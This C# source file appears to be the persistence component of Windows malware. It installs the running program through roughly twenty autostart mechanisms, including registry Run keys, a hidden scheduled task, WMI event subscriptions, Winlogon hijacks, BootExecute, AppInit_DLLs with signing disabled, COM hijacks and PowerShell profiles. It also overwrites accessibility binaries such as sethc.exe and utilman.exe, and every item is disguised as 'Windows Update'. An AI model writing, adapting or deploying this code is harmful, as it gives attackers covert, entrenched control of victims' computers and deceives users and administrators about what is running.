using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace cjh
{
    public class AutoStartService
    {
        private const int TASK_TRIGGER_LOGON = 9;
        private const int TASK_ACTION_EXEC = 0;
        private const int TASK_CREATE_OR_UPDATE = 6;
        private const int TASK_LOGON_INTERACTIVE_TOKEN = 3;

        private readonly string _taskName = "WindowsUpdate";
        private readonly string _regKeyName = "WindowsUpdate";
        private readonly string _appPath;

        public AutoStartService()
        {
            _appPath = Process.GetCurrentProcess().MainModule!.FileName;
        }

        public void RegisterAutoStart(bool isElevated)
        {
            TryWmiPersistence();
            TryRegistryPersistence();
            TryStartupFolderPersistence();
            TryTaskSchedulerPersistence();
            TryRunOncePersistence();
            TryScreenSaverPersistence();
            TryComHijackPersistence();
            TryPowerShellProfilePersistence();
            TryUrlProtocolPersistence();
            TryPathHijackPersistence();

            if (isElevated)
            {
                TryShutdownScriptPersistence();
                TryClrProfilerPersistence();
                TryUserinitPersistence();
                TryServicePersistence();
                TryShellPersistence();
                TryIfeoPersistence();
                TryAppInitDllsPersistence();
                TryActiveSetupPersistence();
                TryAccessibilityPersistence();
                TryLogonScriptPersistence();
                TryBootExecutePersistence();
            }
        }

        private void TryWmiPersistence()
        {
            try
            {
                Type? managementClassType = Type.GetTypeFromProgID("WbemScripting.SWbemLocator");
                if (managementClassType == null) return;

                dynamic? locator = Activator.CreateInstance(managementClassType);
                if (locator == null) return;

                dynamic? service = locator.ConnectServer(".", "root\\subscription");
                if (service == null) return;

                string filterName = "Microsoft_Windows_Explorer_Monitor";
                string consumerName = "Microsoft_Windows_Explorer_Command";

                try
                {
                    dynamic existingFilter = service.Get("__EventFilter.Name='" + filterName + "'");
                    if (existingFilter != null) existingFilter.Delete_();
                }
                catch { }

                try
                {
                    dynamic existingConsumer = service.Get("CommandLineEventConsumer.Name='" + consumerName + "'");
                    if (existingConsumer != null) existingConsumer.Delete_();
                }
                catch { }

                try
                {
                    var bindings = service.InstancesOf("__FilterToConsumerBinding");
                    foreach (var binding in bindings)
                    {
                        try
                        {
                            if (binding.Filter.Contains(filterName) && binding.Consumer.Contains(consumerName))
                            {
                                binding.Delete_();
                                break;
                            }
                        }
                        catch { }
                    }
                }
                catch { }

                string query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'";

                dynamic filter = service.Get("__EventFilter").SpawnInstance_();
                filter.Name = filterName;
                filter.EventNamespace = "Root\\Cimv2";
                filter.Query = query;
                filter.QueryLanguage = "WQL";
                filter.Put_(2);

                dynamic consumer = service.Get("CommandLineEventConsumer").SpawnInstance_();
                consumer.Name = consumerName;
                consumer.CommandLineTemplate = "\"" + _appPath + "\"";
                consumer.Put_(2);

                dynamic newBinding = service.Get("__FilterToConsumerBinding").SpawnInstance_();
                newBinding.Filter = "__EventFilter.Name='" + filterName + "'";
                newBinding.Consumer = "CommandLineEventConsumer.Name='" + consumerName + "'";
                newBinding.Put_(2);
            }
            catch
            {
            }
        }

        private void TryRegistryPersistence()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key?.SetValue(_regKeyName, _appPath, RegistryValueKind.String);
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key?.SetValue(_regKeyName, _appPath, RegistryValueKind.String);
                }
            }
            catch { }
        }

        private void TryStartupFolderPersistence()
        {
            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string shortcutPath = Path.Combine(startupFolder, "WindowsUpdate.lnk");

                if (File.Exists(shortcutPath))
                {
                    File.Delete(shortcutPath);
                }

                Type? shellType = Type.GetTypeFromProgID("WScript.Shell");
                if (shellType == null) return;

                dynamic? shell = Activator.CreateInstance(shellType);
                if (shell == null) return;

                dynamic shortcut = shell.CreateShortcut(shortcutPath);
                shortcut.TargetPath = _appPath;
                shortcut.WorkingDirectory = Path.GetDirectoryName(_appPath);
                shortcut.Save();
            }
            catch { }
        }

        private void TryTaskSchedulerPersistence()
        {
            try
            {
                Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
                if (taskSchedulerType == null) return;

                dynamic? taskService = Activator.CreateInstance(taskSchedulerType);
                if (taskService == null) return;
                taskService.Connect();

                dynamic rootFolder = taskService.GetFolder("\\");
                try { rootFolder.DeleteTask(_taskName, 0); } catch { }

                dynamic taskDefinition = taskService.NewTask(0);

                dynamic regInfo = taskDefinition.RegistrationInfo;
                regInfo.Author = "Microsoft";
                regInfo.Description = "Windows Update";

                dynamic settings = taskDefinition.Settings;
                settings.StartWhenAvailable = true;
                settings.Hidden = true;
                settings.DisallowStartIfOnBatteries = false;
                settings.StopIfGoingOnBatteries = false;
                settings.ExecutionTimeLimit = "PT0S";

                dynamic triggers = taskDefinition.Triggers;
                dynamic trigger = triggers.Create(TASK_TRIGGER_LOGON);
                trigger.Id = "Trigger1";

                dynamic actions = taskDefinition.Actions;
                dynamic action = actions.Create(TASK_ACTION_EXEC);
                action.Path = _appPath;

                rootFolder.RegisterTaskDefinition(
                    _taskName,
                    taskDefinition,
                    TASK_CREATE_OR_UPDATE,
                    Missing.Value,
                    Missing.Value,
                    TASK_LOGON_INTERACTIVE_TOKEN,
                    Missing.Value);
            }
            catch { }
        }

        private void TryShutdownScriptPersistence()
        {
            try
            {
                string sys32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string shutdownDir = Path.Combine(sys32Path, "GroupPolicy", "Machine", "Scripts", "Shutdown");
                string scriptPath = Path.Combine(shutdownDir, "startup.bat");
                string iniPath = Path.Combine(shutdownDir, "scripts.ini");

                if (!Directory.Exists(shutdownDir))
                {
                    Directory.CreateDirectory(shutdownDir);
                }

                File.WriteAllText(scriptPath, "@echo off\r\nstart \"\" \"" + _appPath + "\"\r\ndel \"%~f0\"");

                if (!File.Exists(iniPath))
                {
                    string iniContent = "[Shutdown]\r\n0CmdLine=startup.bat\r\n0Parameters=\r\n";
                    File.WriteAllText(iniPath, iniContent);
                }
            }
            catch { }
        }

        private void TryClrProfilerPersistence()
        {
            try
            {
                string profilerGuid = "{B3728EC4-0C0A-48F2-B39E-7B9425012CCE}";

                using (var key = Registry.CurrentUser.CreateSubKey(@"Environment"))
                {
                    key?.SetValue("COR_ENABLE_PROFILING", "1", RegistryValueKind.String);
                    key?.SetValue("COR_PROFILER", profilerGuid, RegistryValueKind.String);
                    key?.SetValue("COR_PROFILER_PATH", _appPath, RegistryValueKind.String);
                }
            }
            catch { }
        }

        private void TryUserinitPersistence()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    if (key != null)
                    {
                        string existingUserinit = key.GetValue("Userinit") as string ?? "C:\\Windows\\system32\\userinit.exe,";
                        if (!existingUserinit.Contains(_appPath))
                        {
                            key.SetValue("Userinit", existingUserinit + "\"" + _appPath + "\",", RegistryValueKind.String);
                        }
                    }
                }
            }
            catch { }
        }

        private void TryRunOncePersistence()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce"))
                {
                    key?.SetValue(_regKeyName, _appPath, RegistryValueKind.String);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce"))
                {
                    key?.SetValue(_regKeyName, _appPath, RegistryValueKind.String);
                }
            }
            catch { }
        }

        private void TryServicePersistence()
        {
            try
            {
                string serviceName = "WindowsUpdateService";
                string serviceDisplay = "Windows Update Service";
                string binPath = "\"" + _appPath + "\"";

                using var process = new Process();
                process.StartInfo.FileName = "sc.exe";
                process.StartInfo.Arguments = "create \"" + serviceName + "\" binPath= " + binPath + " start= auto DisplayName= \"" + serviceDisplay + "\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit(5000);

                using var descProcess = new Process();
                descProcess.StartInfo.FileName = "sc.exe";
                descProcess.StartInfo.Arguments = "description \"" + serviceName + "\" \"Provides software updates for Windows system components.\"";
                descProcess.StartInfo.UseShellExecute = false;
                descProcess.StartInfo.CreateNoWindow = true;
                descProcess.StartInfo.RedirectStandardOutput = true;
                descProcess.Start();
                descProcess.WaitForExit(5000);
            }
            catch { }
        }

        private void TryShellPersistence()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    if (key != null)
                    {
                        string existingShell = key.GetValue("Shell") as string ?? "explorer.exe";
                        if (!existingShell.Contains(_appPath))
                        {
                            key.SetValue("Shell", existingShell + "," + _appPath, RegistryValueKind.String);
                        }
                    }
                }
            }
            catch { }
        }

        private void TryIfeoPersistence()
        {
            string[] targets = { "sethc.exe", "utilman.exe", "magnify.exe", "narrator.exe", "osk.exe", "DisplaySwitch.exe" };
            foreach (string target in targets)
            {
                try
                {
                    using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + target))
                    {
                        key?.SetValue("Debugger", _appPath, RegistryValueKind.String);
                    }
                }
                catch { }
            }
        }

        private void TryAppInitDllsPersistence()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"))
                {
                    if (key != null)
                    {
                        key.SetValue("AppInit_DLLs", _appPath, RegistryValueKind.String);
                        key.SetValue("LoadAppInit_DLLs", 1, RegistryValueKind.DWord);
                        key.SetValue("RequireSignedAppInit_DLLs", 0, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }
        }

        private void TryActiveSetupPersistence()
        {
            try
            {
                string componentId = "{C9E4A5B0-3C7D-4D6E-8F2A-1B3C4D5E6F7A}";
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Active Setup\Installed Components\" + componentId))
                {
                    if (key != null)
                    {
                        key.SetValue("", "Windows Update Component", RegistryValueKind.String);
                        key.SetValue("StubPath", _appPath, RegistryValueKind.String);
                        key.SetValue("IsInstalled", 1, RegistryValueKind.DWord);
                        key.SetValue("Version", "1,0,0,0", RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        private void TryScreenSaverPersistence()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
                {
                    if (key != null)
                    {
                        key.SetValue("SCRNSAVE.EXE", _appPath, RegistryValueKind.String);
                        key.SetValue("ScreenSaveActive", "1", RegistryValueKind.String);
                        key.SetValue("ScreenSaverIsSecure", "0", RegistryValueKind.String);
                        key.SetValue("ScreenSaveTimeOut", "60", RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        private void TryAccessibilityPersistence()
        {
            try
            {
                string sys32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string[] targets = { "sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe" };

                foreach (string target in targets)
                {
                    try
                    {
                        string targetPath = Path.Combine(sys32Path, target);
                        if (File.Exists(targetPath))
                        {
                            string backupPath = targetPath + ".bak";
                            if (!File.Exists(backupPath))
                            {
                                File.Copy(targetPath, backupPath);
                            }
                            File.Copy(_appPath, targetPath, true);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void TryLogonScriptPersistence()
        {
            string sys32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);

            try
            {
                string logonDir = Path.Combine(sys32Path, "GroupPolicy", "Machine", "Scripts", "Startup");
                string scriptPath = Path.Combine(logonDir, "startup.bat");
                string iniPath = Path.Combine(logonDir, "scripts.ini");

                if (!Directory.Exists(logonDir))
                {
                    Directory.CreateDirectory(logonDir);
                }

                File.WriteAllText(scriptPath, "@echo off\r\nstart \"\" \"" + _appPath + "\"");

                if (!File.Exists(iniPath))
                {
                    string iniContent = "[Startup]\r\n0CmdLine=startup.bat\r\n0Parameters=\r\n";
                    File.WriteAllText(iniPath, iniContent);
                }
            }
            catch { }

            try
            {
                string userLogonDir = Path.Combine(sys32Path, "GroupPolicy", "User", "Scripts", "Logon");
                string scriptPath2 = Path.Combine(userLogonDir, "logon.bat");
                string iniPath2 = Path.Combine(userLogonDir, "scripts.ini");

                if (!Directory.Exists(userLogonDir))
                {
                    Directory.CreateDirectory(userLogonDir);
                }

                File.WriteAllText(scriptPath2, "@echo off\r\nstart \"\" \"" + _appPath + "\"");

                if (!File.Exists(iniPath2))
                {
                    string iniContent = "[Logon]\r\n0CmdLine=logon.bat\r\n0Parameters=\r\n";
                    File.WriteAllText(iniPath2, iniContent);
                }
            }
            catch { }
        }

        private void TryComHijackPersistence()
        {
            try
            {
                string[] targetClsids = {
                    "{42aedc87-2188-41fd-b9a3-0c966feabec1}",
                    "{fbeb8a05-beee-4442-804e-409d6c4515e9}",
                    "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}",
                    "{4E14FBA2-2E22-11D1-9964-00C04FBBB345}"
                };

                foreach (string clsid in targetClsids)
                {
                    try
                    {
                        using var key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + clsid + @"\InprocServer32");
                        key?.SetValue("", _appPath, RegistryValueKind.String);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void TryBootExecutePersistence()
        {
            try
            {
                using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager");
                if (key != null)
                {
                    string appCmd = "\"" + _appPath + "\"";
                    var existing = key.GetValue("BootExecute") as string[];
                    if (existing == null || existing.Length == 0)
                    {
                        key.SetValue("BootExecute", new string[] { appCmd }, RegistryValueKind.MultiString);
                    }
                    else
                    {
                        bool found = false;
                        foreach (string entry in existing)
                        {
                            if (entry.Contains(_appPath))
                            {
                                found = true;
                                break;
                            }
                        }
                        if (!found)
                        {
                            var newList = new string[existing.Length + 1];
                            Array.Copy(existing, newList, existing.Length);
                            newList[existing.Length] = appCmd;
                            key.SetValue("BootExecute", newList, RegistryValueKind.MultiString);
                        }
                    }
                }
            }
            catch { }
        }

        private void TryPowerShellProfilePersistence()
        {
            try
            {
                string allUsersPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "..", "WindowsPowerShell", "v1.0", "profile.ps1");
                string content = "Start-Process \"" + _appPath + "\" -WindowStyle Hidden";

                if (File.Exists(allUsersPath))
                {
                    string existing = File.ReadAllText(allUsersPath);
                    if (!existing.Contains(_appPath))
                    {
                        File.AppendAllText(allUsersPath, "\r\n" + content);
                    }
                }
                else
                {
                    string? dir = Path.GetDirectoryName(allUsersPath);
                    if (dir != null && !Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    File.WriteAllText(allUsersPath, content);
                }
            }
            catch { }

            try
            {
                string userProfile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "WindowsPowerShell", "profile.ps1");
                string content2 = "Start-Process \"" + _appPath + "\" -WindowStyle Hidden";

                if (File.Exists(userProfile))
                {
                    string existing = File.ReadAllText(userProfile);
                    if (!existing.Contains(_appPath))
                    {
                        File.AppendAllText(userProfile, "\r\n" + content2);
                    }
                }
                else
                {
                    string? dir = Path.GetDirectoryName(userProfile);
                    if (dir != null && !Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    File.WriteAllText(userProfile, content2);
                }
            }
            catch { }
        }

        private void TryUrlProtocolPersistence()
        {
            try
            {
                using var key = Registry.ClassesRoot.CreateSubKey(@"WindowsUpdate");
                if (key != null)
                {
                    key.SetValue("", "URL:Windows Update Protocol", RegistryValueKind.String);
                    key.SetValue("URL Protocol", "", RegistryValueKind.String);

                    using var shellKey = key.CreateSubKey(@"shell\open\command");
                    shellKey?.SetValue("", "\"" + _appPath + "\" \"%1\"", RegistryValueKind.String);
                }
            }
            catch { }
        }

        private void TryPathHijackPersistence()
        {
            try
            {
                string? appDir = Path.GetDirectoryName(_appPath);
                if (appDir == null) return;

                string[] hijackTargets = { "utilman.exe", "sethc.exe", "magnify.exe", "osk.exe", "narrator.exe" };
                foreach (string target in hijackTargets)
                {
                    try
                    {
                        string destPath = Path.Combine(appDir, target);
                        File.Copy(_appPath, destPath, true);
                    }
                    catch { }
                }

                using var key = Registry.CurrentUser.CreateSubKey(@"Environment");
                if (key != null)
                {
                    string existingPath = key.GetValue("PATH") as string ?? "";
                    if (!existingPath.Contains(appDir))
                    {
                        key.SetValue("PATH", appDir + ";" + existingPath, RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }
    }
}
